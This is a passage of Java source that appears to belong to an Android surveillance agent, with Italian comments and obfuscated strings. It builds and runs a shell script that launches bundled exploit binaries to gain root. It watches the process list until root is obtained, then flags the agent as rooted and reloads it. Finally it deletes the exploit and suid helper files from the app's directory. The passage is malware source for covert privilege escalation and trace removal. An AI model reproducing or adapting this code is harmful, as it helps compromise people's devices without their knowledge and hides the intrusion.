				// - argv[1]: path assoluto alla nuova shell
				// - argv[2]: path assoluto alla vecchia shell
				String pack = Status.getAppContext().getPackageName();

				String script = M.e("#!/system/bin/sh")
						+ "\n"
						+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"),
								pack, pack, pack) + "\n";

				if (Root.createScript("fig", script) == true) {
					Process runScript = Runtime.getRuntime().exec(path + "/fig");

					// Non serve
					runScript.waitFor();

					if (Cfg.DEBUG) {
						Check.log(TAG + "(run): " + runScript.getClass());
					}

					// Monitor exploit execution
					boolean finished = true;
					long curTime = System.currentTimeMillis();

					while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
						ExecuteResult result = Execute.execute("ps");

						for (String s : result.stdout) {
							if (s.contains("/files/vs")) {
								if (Cfg.DEBUG) {
									Check.log(TAG + "(run): exploitation in progress");
								}

								finished = false;
								break;
							}
						}

						if (finished || PackageInfo.checkRoot()) {
							if (Cfg.DEBUG) {
								Check.log(TAG + "(run): exploitation terminated after "
										+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
							}

							Status.setRoot(true);
							Status.self().setReload();

							break;
						}

						finished = true;
						Utils.sleep(5000);
					}

					Root.removeScript("fig");
					if (getPermissions()) {
						Status.self().setReload();
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " ERROR: (run), cannot create script");
					}
					PackageInfo.checkRoot();
				}

			} catch (final Exception e1) {
				if (Cfg.EXCEPTION) {
					Check.log(e1);
				}

				if (Cfg.DEBUG) {
					Check.log(e1);//$NON-NLS-1$
					Check.log(TAG + " (run): Exception"); //$NON-NLS-1$
				}

				return;
			} finally {
				File file = new File(Status.getAppContext().getFilesDir(), localExploit);
				file.delete();

				file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
				file.delete();

				file = new File(Status.getAppContext().getFilesDir(), suidext);
				file.delete();
			}
		}
	}
}